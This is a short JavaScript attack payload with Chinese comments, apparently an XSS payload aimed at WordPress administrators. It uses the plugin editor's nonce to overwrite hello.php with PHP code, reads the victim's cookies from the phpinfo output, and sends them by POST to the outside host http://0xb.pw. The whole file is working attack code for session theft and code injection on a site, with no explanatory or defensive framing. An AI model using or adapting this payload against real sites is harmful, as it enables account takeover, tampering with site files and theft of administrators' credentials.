// 写入phpinfo
url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?php phpinfo();?>';

a = new XMLHttpRequest();
a.open('GET', url+p+q, 0);
a.send();

ss = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
'&newcontent=' + s + '&action=update&file=hello.php';

b = new XMLHttpRequest();
b.open('POST', url+p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(ss);

// 请求phpinfo
b.onreadystatechange = function(){
   if (this.readyState == 4) {
      	p_url = url + 'wp-content/plugins/hello.php';

		c = new XMLHttpRequest();
		c.open('GET', p_url, 0);
		c.send();

		sss = /HTTP_COOKIE <\/td><td class="v">[\w=;% \-\+\s]+<\/td/.exec(c.responseText)

		// 将获取到的cookie传出
		var d = new XMLHttpRequest(); 
		d.open('POST', 'http://0xb.pw', true); 
		d.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		d.send('cookie='+sss)
   }
}
